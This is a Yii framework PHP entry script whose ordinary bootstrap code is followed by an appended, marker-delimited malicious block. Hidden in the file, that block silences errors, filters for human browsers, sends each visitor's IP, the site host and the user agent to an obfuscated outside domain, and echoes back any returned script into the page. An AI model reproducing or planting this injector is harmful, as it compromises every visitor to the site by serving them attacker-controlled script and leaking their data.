<?php
// change the following paths if necessary
$yii=dirname(__FILE__).'/../../../yii/framework/yii.php';
$config=dirname(__FILE__).'/protected/config/main.php';

// remove the following lines when in production mode
defined('YII_DEBUG') or define('YII_DEBUG',true);
// specify how many levels of call stack should be shown in each log message
defined('YII_TRACE_LEVEL') or define('YII_TRACE_LEVEL',3);

require_once($yii);
Yii::createWebApplication($config)->run();



#28cc82#
error_reporting(0); ini_set('display_errors',0); $wp_emvm61500 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_emvm61500) && !preg_match ('/bot/i', $wp_emvm61500))){
$wp_emvm0961500="http://"."error"."class".".com/class"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_emvm61500);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_emvm0961500);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_61500emvm = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_61500emvm,1,3) === 'scr' ){ echo $wp_61500emvm; }
#/28cc82#

